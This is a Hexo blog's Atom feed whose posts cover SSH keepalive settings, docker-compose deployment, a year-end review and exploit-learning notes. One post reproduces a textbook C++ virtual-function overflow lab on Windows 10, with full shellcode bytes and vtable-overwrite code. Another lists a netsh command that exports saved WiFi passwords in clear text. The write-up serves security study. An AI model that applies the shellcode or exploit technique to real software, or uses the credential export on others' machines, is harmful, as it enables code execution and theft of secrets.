<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>糖醋大白菜 の 后花园</title>
  
  <subtitle>蚂蚁森林小王子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-22T07:14:03.966Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>糖醋大白菜</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/03/22/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/03/22/工具记录/</id>
    <published>2020-03-22T07:14:03.925Z</published>
    <updated>2020-03-22T07:14:03.966Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/32074947" target="_blank" rel="noopener">google hacking</a></p><h3 id="python代码审计-查看Python代码中的安全问题"><a href="#python代码审计-查看Python代码中的安全问题" class="headerlink" title="python代码审计,查看Python代码中的安全问题"></a>python代码审计,查看Python代码中的安全问题</h3><ol><li><a href="https://forum.90sec.com/t/topic/795" target="_blank" rel="noopener">如何在Python应用程序中查找安全漏洞？</a></li><li></li></ol><h3 id="web-fuzz测试工具"><a href="#web-fuzz测试工具" class="headerlink" title="web fuzz测试工具"></a>web fuzz测试工具</h3><ol><li>Wfuzz：一款强大的Web Fuzz测试工具</li><li>teenage mutant ninja turtles V 1.5<br><a href="https://www.freebuf.com/sectool/76861.html" target="_blank" rel="noopener">TMNT Freebuf介绍文章</a></li></ol><h3 id="Fuzz工具未整理"><a href="#Fuzz工具未整理" class="headerlink" title="Fuzz工具未整理"></a>Fuzz工具未整理</h3><p><a href="https://www.freebuf.com/sectool/76861.html" target="_blank" rel="noopener">关于Fuzz工具的那些事儿</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32074947&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;google hacking&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;python代码审计-查看Python代码中的安全问题
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>保持ssh连接，防止ssh连接自动断开的方法总结</title>
    <link href="http://yoursite.com/2020/02/23/%E4%BF%9D%E6%8C%81ssh%E8%BF%9E%E6%8E%A5%EF%BC%8C%E9%98%B2%E6%AD%A2ssh%E8%BF%9E%E6%8E%A5%E8%87%AA%E5%8A%A8%E6%96%AD%E5%BC%80%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/02/23/保持ssh连接，防止ssh连接自动断开的方法总结/</id>
    <published>2020-02-23T13:09:33.743Z</published>
    <updated>2020-02-23T13:16:57.723Z</updated>
    
    <content type="html"><![CDATA[<p>该篇文章直接转载的<a href="https://me.csdn.net/Earl_yuan" target="_blank" rel="noopener">Earl_yuan</a>同学总结的内容，方便以后查阅，原文地址：<a href="https://blog.csdn.net/Earl_yuan/article/details/50454032" target="_blank" rel="noopener">SSH 保持连接 （解决Broken pipe）</a></p><p>在使用SSH客户端进行连接管理的时候如果长时间不输入命令， 服务器会自动断开连接， 尤其是有的人使用SSH作为代理连接这样的情况更是突出， 因此我在网上搜集了可以让 SSH 保持连接的方法与大家分享</p><h3 id="在服务器端，-可以让服务器发送“心跳”信号测试提醒客户端进行保持连接"><a href="#在服务器端，-可以让服务器发送“心跳”信号测试提醒客户端进行保持连接" class="headerlink" title="在服务器端， 可以让服务器发送“心跳”信号测试提醒客户端进行保持连接"></a>在服务器端， 可以让服务器发送“心跳”信号测试提醒客户端进行保持连接</h3><p>通过修改 sshd 的配置文件，能够让 SSH Server 发送“心跳”信号来维持持续连接，下面是设置的内容</p><p>打开服务器 /etc/ssh/sshd_config，我在最后增加一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClientAliveInterval 60</span><br><span class="line">ClientAliveCountMax 3</span><br></pre></td></tr></table></figure></p><p>这 样，SSH Server 每 60 秒就会自动发送一个信号给 Client，而等待 Client 回应，（注意：是服务器发心跳信号，不是客户端，这个有别于一些 FTP Client 发送的 KeepAlives 信号哦～～～），如果客户端没有回应，会记录下来直到记录数超过 ClientAliveCountMax 的值时，才会断开连接。</p><p>###如果你没有服务器端管理权限， 在客户端进行设置也可以实现</p><p>只要在/etc/ssh/ssh_config文件里加两个参数就行了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCPKeepAlive yes</span><br><span class="line">ServerAliveInterval 300</span><br></pre></td></tr></table></figure></p><p>前一个参数是说要保持连接，后一个参数表示每过5分钟发一个数据包到服务器表示“我还活着”</p><p>如果你没有root权限，修改或者创建~/.ssh/ssh_config也是可以的</p><p>在这种方法中， 如果你只想针对某一个ssh连接进行持续， 你可以将上述配置文件复制一下进行修改然后在连接的时候使用 -F参数进行配置文件的指定。 当然因为只需要修改两个参数， 你也可以直接在连接命令中进行设定即：</p><h3 id="使用客户端针对某一个ssh连接进行设置"><a href="#使用客户端针对某一个ssh连接进行设置" class="headerlink" title="使用客户端针对某一个ssh连接进行设置"></a>使用客户端针对某一个ssh连接进行设置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o TCPKeepAlive=yes -o ServerAliveInterval=300 user@ip -p password</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;该篇文章直接转载的&lt;a href=&quot;https://me.csdn.net/Earl_yuan&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Earl_yuan&lt;/a&gt;同学总结的内容，方便以后查阅，原文地址：&lt;a href=&quot;https://blog.cs
      
    
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/categories/docker/"/>
    
      <category term="Java" scheme="http://yoursite.com/categories/docker/Java/"/>
    
    
      <category term="spring boot" scheme="http://yoursite.com/tags/spring-boot/"/>
    
      <category term="docker-compose" scheme="http://yoursite.com/tags/docker-compose/"/>
    
      <category term="网站运维" scheme="http://yoursite.com/tags/%E7%BD%91%E7%AB%99%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>0day-win10下实现攻击C++的虚函数</title>
    <link href="http://yoursite.com/2020/02/12/0day-win10%E4%B8%8B%E6%94%BB%E5%87%BBC++%E8%99%9A%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2020/02/12/0day-win10下攻击C++虚函数/</id>
    <published>2020-02-12T07:46:20.811Z</published>
    <updated>2020-02-12T11:36:44.468Z</updated>
    
    <content type="html"><![CDATA[<p>在《0day安全——软件安全分析》一书的6.3节提供了C++虚函数的攻击概念，本文为对应章节的具体实操。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6-3-attack-virtual-func.cpp : This file contains the 'main' function. Program execution begins and ends there.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 学习写shellcode，并且将十六进制字符转为代码</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span> </span><br><span class="line"><span class="string">"\x64\xD3\x41\x00"</span>; <span class="comment">//set fake virtual function pointer,180 Byte // 176Byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x0041d364+0XB0 = 0x0041d414</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x0040881C 地址为buf入口的地址（也就是shellcode入口的地址），0x004088CC 地址为伪造的虚函数地址</span></span><br><span class="line"><span class="comment">// 改地址可以放在shellcode前面也可以放在shellcode后面，在编译的时候将地址随机化和DEP关闭。</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Class Vtable::test()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Failwest overflow, * p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p_vtable;</span><br><span class="line"></span><br><span class="line">p_vtable = overflow.buf - <span class="number">4</span>; <span class="comment">//point to virtual table，虚表指针位于char buf[200]之前，通过这句代码定位到该指针。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line"><span class="comment">//the address may need to ajusted via runtime debug p_vtable[0]=0xCC;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x0041d414</span></span><br><span class="line"><span class="comment">// ask: 这里如果直接改成buf的地址，即虚表指针指向shellcode首地址，为什么不可以</span></span><br><span class="line">p_vtable[<span class="number">0</span>] = <span class="number">0x14</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>] = <span class="number">0xd4</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>] = <span class="number">0x41</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf, shellcode); <span class="comment">//set fake virtual functionpointer </span></span><br><span class="line"></span><br><span class="line">p = &amp;overflow;</span><br><span class="line">   p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>了解了C++虚函数的调用过程之后，我们就明白了这个代码利用了栈中的缓冲区溢出，攻击流程为：修改虚表指针的内容，将其指向shellcode的首部或者尾部（这个时候shellcode 已经被复制到缓冲区中），这个代码给的是将 虚表指针指向buf缓冲区(shellcode)的尾部，然后再将虚表中 的虚函数指针指向shellcode的首部来执行代码，那么我们如何得到这个shellcode的地址？</p><p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbtsk8goxuj31bg0icdi0.jpg" alt></p><p>因为C++的虚函数在调用的时候，程序会先通过虚表指针寻找虚函数的地址，这里虚函数的地址为修改 <strong>0x0041d414</strong>，然后再修改“虚函数”的地址指向shellcode，这里“虚函数”的实际入口地址为 shellcode的尾部的8字节地址<strong>0x0041d364</strong>。</p><p>还有一个问题是，visual studio2019 默认开启ASLR和DEP，我们需要在系统和编译选项中将其关闭，win10关闭ASLR比较容易，直接在设置里面就可以直接关闭，具体参见这篇文章：<a href="https://ctf.dontpanic.blog/notes/stack-buffer-overflow-aslr.html" target="_blank" rel="noopener">栈缓冲区溢出之二 ASLR</a> ；然后在项目的选项中修改ASLR和DEP为disable即可（项目选项—&gt;链接器—&gt;高级）。<br><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbttfamimbj30lu0f40wm.jpg" alt></p><p>由于ASLR和DEP都已经关闭了，所以直接通过VS  的Debug —&gt; Windows —&gt; Watch (Autos)观看变量的地址。<br><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbtti0xvs2j30xu0bw42n.jpg" alt><br>这里得到overflow.buf的地址，我们要得到shellcode的末尾8字节的地址，就需要加上中间176个字节的shellcode字节码，即 0x0041d364+0XB0 = 0x0041d414，所以在p_vtable中填入这个地址。<br><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbttok7l1yj30sa0ant97.jpg" alt></p><p>最后，在这个过程中，我直接修改虚表指针指向buf的首地址为什么不可以？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在《0day安全——软件安全分析》一书的6.3节提供了C++虚函数的攻击概念，本文为对应章节的具体实操。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li
      
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
      <category term="0day" scheme="http://yoursite.com/categories/C/0day/"/>
    
    
      <category term="C++虚函数" scheme="http://yoursite.com/tags/C-%E8%99%9A%E5%87%BD%E6%95%B0/"/>
    
      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/02/05/%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
    <id>http://yoursite.com/2020/02/05/命令集合(持续更新)/</id>
    <published>2020-02-05T07:54:21.609Z</published>
    <updated>2020-02-15T10:55:57.634Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title: 一些不常用的命令集合</span><br></pre></td></tr></table></figure><h3 id="Windows-OS"><a href="#Windows-OS" class="headerlink" title="Windows OS"></a>Windows OS</h3><ol><li><p>获取Windows平台下所有的WiFi密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile</span><br><span class="line">netsh  wlan <span class="built_in">export</span> profile folder=c:\ key=clear</span><br></pre></td></tr></table></figure></li><li><p>获取电池使用报告<br><code>使用</code>powercfg /batteryreport` 可以获得电池使用的详细报告，生成一个HTML文件 。</p></li></ol><h3 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h3><ol><li>获取Mac的CPU 架构信息</li></ol><p>在安装 pwntools时，需要指定CPU的架构 ，这个网站上列出了pwntools支持的所有CPU架构：<a href="https://github.com/Gallopsled/pwntools-binutils/tree/master/osx" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools-binutils/tree/master/osx</a> ，想要知道Mac的CPU 架构，只需要在terminal中输入arch即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漏洞利用专有概念记录(持续更新中)</title>
    <link href="http://yoursite.com/2020/02/05/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%93%E6%9C%89%E6%A6%82%E5%BF%B5%E8%AE%B0%E5%BD%95(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/"/>
    <id>http://yoursite.com/2020/02/05/漏洞利用专有概念记录(持续更新中)/</id>
    <published>2020-02-05T04:13:12.850Z</published>
    <updated>2020-02-14T12:57:31.004Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Windows 安全机制汇总（在《0day安全-软件分析技术》中第9章，表9-1-1）</strong></p><p>GS 编译技术：针对栈中函数的返回地址被覆盖这一攻击手法，在函数返回地址前加入security cookie，在函数返回时要先检查security cookie是否被覆盖，操作系统的栈溢出会变得异常艰难，软件可以选择在编译的时候是否开启该选项。</p><p>S.E.H 机制：SEH机制是异常处理机制，用来捕获异常 ，攻击者一般会将进行异常处理的程序的地址进行覆盖，从而达到执行其代码的目的。</p><p>DEP：data execution protection ，数据执行保护。将数据标记为不可执行，解决了指令和数据未区分开的问题。</p><p>ASLR：address space layout random，地址空间分布随机化，将某些关键的模块的地址随机化。</p><p>SEHOP：structure exception handler overwrite protection , SEH的系统级覆盖写保护机制，具体怎么保护的，再议。</p><p><strong> 0x63756620  代码为Windows下   “ fuc”   的ASCII编码。</strong></p><p><strong>攻击C++虚函数的核心思想：</strong></p><p>如果存在栈溢出的漏洞，查看是否能够修改虚表指针或是虚表中的虚函数指针，如果可以，即可以将虚表指针（或是虚表中的虚函数指针）指向shellcode的地址。这就是攻击C++虚函数的核心思想。</p><p><strong>程序加载到内存中逆向出来的段的内容：</strong></p><p>idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。<br>data: 这个段存放程序的全局数据、全局常量等。<br>rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</p><p>MP3的文件格式头部为：ID3</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Windows 安全机制汇总（在《0day安全-软件分析技术》中第9章，表9-1-1）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GS 编译技术：针对栈中函数的返回地址被覆盖这一攻击手法，在函数返回地址前加入security cookie，在函数返回时要先检查secu
      
    
    </summary>
    
      <category term="安全渗透" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>2019年度总结&amp;2020年度规划</title>
    <link href="http://yoursite.com/2020/01/02/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93&amp;2020%E5%B9%B4%E5%BA%A6%E8%A7%84%E5%88%92/"/>
    <id>http://yoursite.com/2020/01/02/2019年度总结&amp;2020年度规划/</id>
    <published>2020-01-02T01:12:53.989Z</published>
    <updated>2020-01-07T11:38:33.529Z</updated>
    
    <content type="html"><![CDATA[<p>一年到头总需要写点什么或纪念、或回忆一下今年一年的生活，那么这篇文章的标题称之为我的2019大概会显得更有文人气息。凡此种种的总结，总不免要费些脑力来思考，今年下半年脑力思考的远远不及上半年的强度，这也是我在年底的时候发现的一个问题，现时代获取信息的途径很多，获取信息的难度也降低了很多，但是如何将信息转化为知识则是一门学问，深度思考无疑是一种行之有效的方式之一。</p><h2 id="2019年度总结"><a href="#2019年度总结" class="headerlink" title="2019年度总结"></a>2019年度总结</h2><p>今年在我的一生中可以称之为一个小小的转折点，因为我毕业了。</p><h3 id="一九足迹"><a href="#一九足迹" class="headerlink" title="一九足迹"></a>一九足迹</h3><p>1、年初的时候和几位好友来到了成都和重庆，山城不愧为山城，川渝的火锅是真的辣的不行。</p><p>2、春夏时节一直在郑州准备毕业相关事宜，也没有办法出去玩耍，甚是可惜，在校的话还是可以多趁着寒暑假出去玩一玩。</p><p>3、7.26到南京的公司报道，短暂的一段南京时光之后，又双叒叕于8.13来到厦门分公司进行培训</p><p>今年去了几个旅游城市，在厦门待了将近5个月的时间，也算感受了一波南方城市的天气。</p><h3 id="技术方面"><a href="#技术方面" class="headerlink" title="技术方面"></a>技术方面</h3><p>1、今年上半年买了人生第一台MacBook Pro，正是因为这台Mac，让我多写了不少的代码。哈哈</p><p>2、今年新建了一个GitHub账号：flowerlake。今年新建了几个项目，但项目本身还不够规范，这里就先列出两个吧。</p><ul><li><a href="https://github.com/flowerlake/meng_event_spider" target="_blank" rel="noopener">flowerlake/meng_event_spider</a>：爬取孟晚舟相关事件的新闻的一个方法，这个项目之所以单独列出来，是在结合scrapy框架的基础上，做了一个爬虫 的通用抽取方法，主要利用点是抽取的关键信息是一样的，这样就可以自定义规则库，只要规则库够大，就可以来抽取任意网页的内容。</li><li><a href="https://github.com/flowerlake/spring-blog-website" target="_blank" rel="noopener">flowerlake/spring-blog-website</a>：这个项目是spring boot开发web网站的一个教程吧，因为网上很多都还是jsp，现在主流的是前后端分离的思想，项目后台是spring boot框架开发的，前端采用模板渲染，前后端分离的还不够彻底，但是对新手有一定的参考价值。</li></ul><p>3、下半年因为工作的需要，开始接触逆向工程的内容，现在还刚刚入门这方面的内容，相比于敲代码逆向学起来确实枯燥无聊。今年下半年代码敲得很少了，但也让我反思了一段时间，代码如何写的更有效率，而不是简单的搬砖，代码API的简单堆砌对个人的提升并不是很大，算法的理解也要更加深入细致一些。</p><p>4、今年第一次正式使用docker，之前也了解了一些，但是今年给同学的一个实验室开发了一个网站，网站要投入到生产中，服务器运维不是第一次接触，但是用docker进行部署是第一次，中间也踩了不少坑，具体可见<a href="https://flowerlake.github.io/2019/12/22/docker%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%BF%E7%94%A8docker-compose%E9%83%A8%E7%BD%B2%20Spring%20Boot%20%E9%A1%B9%E7%9B%AE/" target="_blank" rel="noopener">docker系列之使用docker-compose部署Nginx+MySQL+MongoDB+Spring Boot项目</a> 。</p><p>5、其实今年相比于在校的爆发期，接触新技术的点少了，不像在学校是全面了解，今年我也更加有侧重点的开始针对某一个点进行深度的挖掘与学习。想必之前很喜欢的深度学习方面的知识没法再继续跟下去了，精力有限，有时间再看吧。</p><h3 id="娱乐修养"><a href="#娱乐修养" class="headerlink" title="娱乐修养"></a>娱乐修养</h3><p>1、电影方面：今年看了很多的电影啊，基本上上映的好看的电影都去看了一遍。年中的时候开始有意的使用豆瓣APP来记录自己的观影记录，用着还是不错的。今年总共看了63部电影，其实其中有一些是之前看的，但是是今年才加进去的，就被算作是今年的了。最近越来越喜欢看悬疑剧情的电影了，之前很喜欢看科幻类的，但是也喜欢，但是悬疑类的在我心中的占比越来越大。在我心中 ，今年最佳的电影应该是《捍卫者》吧，这部电影在影视平台上没有上映，当时看的也是盗版的录播画质，有些可惜，但还是直接给打了5星好评，因为很棒。</p><p>2、读书方面：今年看的书不多也不算少，书籍没有做好记录，明年要好好记录下来。不过今年买的实体书有点少，越来越多的直接在微信读书上看了。</p><p>3、电视剧：今年看了《庆余年》、《权游》、《武林外传》、《士兵突击》。感觉《权游》有点烂尾，《庆余年》非常不错，本身比较喜欢古装类的电影电视，演员演技以及剧情都非常奥利给。</p><h3 id="其他方面"><a href="#其他方面" class="headerlink" title="其他方面"></a>其他方面</h3><p>1、今年的毕业让我很伤感，离别时还没有感觉，在自己坐上车离开校门的那一刻，好像这一切的过往渐行渐远。</p><p>2、不过今年我收获了我的小女友，哈哈。她给我的感觉很舒服，很照顾我的感受，也不会要求我很多东西 ，也不会耍特别离谱的小性子，是一个有原则、可爱的小猫咪，我喜欢。</p><h2 id="2020年度规划"><a href="#2020年度规划" class="headerlink" title="2020年度规划"></a>2020年度规划</h2><p><strong>2019.01.07 更新</strong><br>新的一年我目前有两点想要改变的地方：<br>1、减肥。坚持运动并且保持一个适当的饮食，希望在年底能够达到的目标是肚子上的肉可以减少一些 ，有一个明显的变化。<br>2、英语口语流利说。新的一年，希望自己能够坚持学习英语，持续背诵单词，并能够流利的使用英语和他人对话，这是我希望在年底能够达到的目标。</p><hr><h3 id="技术方面-1"><a href="#技术方面-1" class="headerlink" title="技术方面"></a>技术方面</h3><p>1、熟练掌握逆向工程、一定的汇编知识，这两点应该是相辅相成的。</p><p>2、知识不求多，不求广泛，技术点一定要学精。</p><p>3、继续坚持写代码，有一定的代码量，尝试开源一个好的项目，做一个成熟的开源项目。</p><p>4、坚持写博客，每一次的技术学习，或者项目经验都要通过博客的方式记录下来。</p><p>5、关于具体的项目现在还没有思路，需要好好思考一下，并且多读代码，不要只做一个会搬砖的程序员。</p><h3 id="生活方面"><a href="#生活方面" class="headerlink" title="生活方面"></a>生活方面</h3><p>1、多读书、看电影，尝试写书评、写影评。</p><p>2、去广阔的世界再多看看</p><p>还有什么再更新。之前看了一个研究报告，意思说一月份做的计划都不大可能实现，hh，我要做持续的计划，做动态变化的计划，这也是我琢磨的，计划有时候确实因为各种事情没办法完成，就做一个变化的计划，即在小范围内修改，大方向某个时段是不变的，即弹性计划。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一年到头总需要写点什么或纪念、或回忆一下今年一年的生活，那么这篇文章的标题称之为我的2019大概会显得更有文人气息。凡此种种的总结，总不免要费些脑力来思考，今年下半年脑力思考的远远不及上半年的强度，这也是我在年底的时候发现的一个问题，现时代获取信息的途径很多，获取信息的难度
      
    
    </summary>
    
      <category term="闲言碎语" scheme="http://yoursite.com/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
    
    
      <category term="2019" scheme="http://yoursite.com/tags/2019/"/>
    
      <category term="2020" scheme="http://yoursite.com/tags/2020/"/>
    
  </entry>
  
  <entry>
    <title>docker系列之使用docker-compose部署Nginx+MySQL+MongoDB+Spring Boot项目</title>
    <link href="http://yoursite.com/2019/12/22/docker%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BD%BF%E7%94%A8docker-compose%E9%83%A8%E7%BD%B2%20Spring%20Boot%20%E9%A1%B9%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/12/22/docker系列之使用docker-compose部署 Spring Boot 项目/</id>
    <published>2019-12-22T11:18:08.845Z</published>
    <updated>2019-12-26T01:36:52.893Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章讲一讲将项目容器化的实践，主要内容包括以下几个方面：</p><ol><li>docker-compose部署spring boot项目</li><li>docker MongoDB的加密配置</li><li>谈一谈docker的使用、项目的部署等</li></ol><h3 id="docker-compose部署项目"><a href="#docker-compose部署项目" class="headerlink" title="docker-compose部署项目"></a>docker-compose部署项目</h3><p>如果一个项目有很多依赖的环境，如各类数据库，同时又想使用docker这项虚拟化服务的技术，那么就可以尝试使用docker完成一次性部署。本文主要结合上次一个spring boot 开发web的项目的实际经历来记录一下使用docker-compose部署项目的一些经验。<br>找到了一本docker的中文文档，其将docker定义为：</p><blockquote><p>Compose 定位是 「定义和运行多个 Docker 容器的应用（Defining and running multi-container Docker applications）」，负责实现对 Docker 容器集群的快速编排。其前身是开源项目 Fig。</p></blockquote><p>也就是说利用docker-compose可以快速打包多个docker应用，我们的项目中需要用到 Nginx+MySQL+MongoDB+spring boot项目，所以docker-compose也就是对这些容易进行打包，首先来看一下一个docker-compose.yaml的模板文件内容吧。<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 